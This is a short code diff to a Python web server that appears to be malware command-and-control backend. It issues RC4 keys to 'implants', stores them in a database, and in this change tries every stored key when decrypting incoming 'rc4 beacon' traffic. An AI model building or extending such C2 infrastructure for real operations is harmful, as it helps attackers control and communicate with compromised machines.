@@ -111,7 +111,7 @@ class WebServer(object):
             current_user = j["u"]
 
             # generates a random 32 character encryption key (only lower/upper letters, no numbers)
-            # numbers fucks up the rc4 crypt() function
+            # numbers fucks up the rc4 crypt() function for some reason
             encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))
 
             # gets current time (uses server's time)
@@ -133,7 +133,16 @@ class WebServer(object):
 
         # else rc4 beacon
         else:
+            # queries all encryption keys in the "implants" table
+            with self.connection.cursor() as cursor:
+                cursor.execute("SELECT `encryption_key` FROM `implants`")
+                results = cursor.fetchall()
 
-            print(self.crypt("WvpMvdDqbmTwPVJybgQBnKoTQbbfRZKE", self.data))
+                # need to explicitly cast key from tuple to string here
+                for key in results:
+                    print("trying key: " + str(key))
+                    #print("potentially decrypted: " + self.crypt(str(key), self.data))
+
+            #print(self.crypt("WvpMvdDqbmTwPVJybgQBnKoTQbbfRZKE", self.data))
 
             return "rc4 beacon"
